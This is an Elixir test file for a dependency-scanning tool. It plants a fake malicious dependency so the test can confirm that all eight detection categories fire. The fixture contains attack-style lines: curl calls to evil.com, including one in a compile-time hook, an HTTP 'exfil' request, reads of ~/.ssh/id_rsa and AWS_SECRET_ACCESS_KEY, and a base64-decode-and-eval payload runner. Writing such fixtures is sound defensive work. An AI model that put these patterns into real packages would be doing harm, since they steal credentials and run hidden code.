defmodule VetCore.Wiring.ScannerChecksTest do
  use ExUnit.Case, async: true

  @expected_categories [
    :system_exec,
    :code_eval,
    :network_access,
    :file_access,
    :env_access,
    :obfuscation,
    :shady_links,
    :compiler_hooks
  ]

  describe "Scanner is wired to all expected checks" do
    setup do
      # Create a temporary project with a fake dependency that triggers all 8 checks
      tmp_dir = Path.join(System.tmp_dir!(), "vet_wiring_test_#{System.unique_integer([:positive])}")
      dep_dir = Path.join([tmp_dir, "deps", "evil_dep", "lib"])
      File.mkdir_p!(dep_dir)

      # Write a mix.lock so the lock parser can find the dep
      lock_content = ~s(%{"evil_dep": {:hex, :evil_dep, "0.1.0", "abc123", [:mix], [], "hexpm", "def456"}})
      File.write!(Path.join(tmp_dir, "mix.lock"), lock_content)

      # Write a source file that triggers all 8 check categories
      evil_source = ~S"""
      defmodule EvilDep do
        # compiler_hooks: @before_compile callback
        @before_compile __MODULE__

        def sneaky_init do
          # system_exec
          System.cmd("curl", ["https://evil.com"])

          # code_eval
          Code.eval_string("IO.puts(:pwned)")

          # network_access
          :httpc.request(:get, {~c"https://evil.com/exfil", []}, [], [])

          # file_access
          File.read!(Path.expand("~/.ssh/id_rsa"))

          # env_access
          System.get_env("AWS_SECRET_ACCESS_KEY")

          # shady_links
          url = "https://evil.ngrok.io/collect"
          send(self(), url)
        end

        # obfuscation: Base.decode64 + Code.eval_string in same scope
        def run_payload(encoded) do
          decoded = Base.decode64(encoded)
          Code.eval_string(decoded)
        end

        defmacro __before_compile__(_env) do
          # Compile-time-dangerous callback body — the new compiler_hooks
          # check only fires when the resolved callback contains calls like
          # System.cmd / Code.eval / Port.open / HTTP client / binary_to_term.
          System.cmd("curl", ["http://evil.com/ct"])
          quote do: :ok
        end
      end
      """

      File.write!(Path.join(dep_dir, "evil_dep.ex"), evil_source)

      on_exit(fn -> File.rm_rf!(tmp_dir) end)

      {:ok, project_path: tmp_dir}
    end

    test "scan produces findings from all 8 check categories", %{project_path: project_path} do
      {:ok, report} = VetCore.Scanner.scan(project_path, skip_hex: true)

      all_findings =
        report.dependency_reports
        |> Enum.flat_map(& &1.findings)

      found_categories = all_findings |> Enum.map(& &1.category) |> Enum.uniq() |> Enum.sort()

      for category <- @expected_categories do
        assert category in found_categories,
               "Expected category #{inspect(category)} in findings, got: #{inspect(found_categories)}"
      end
    end
  end
end
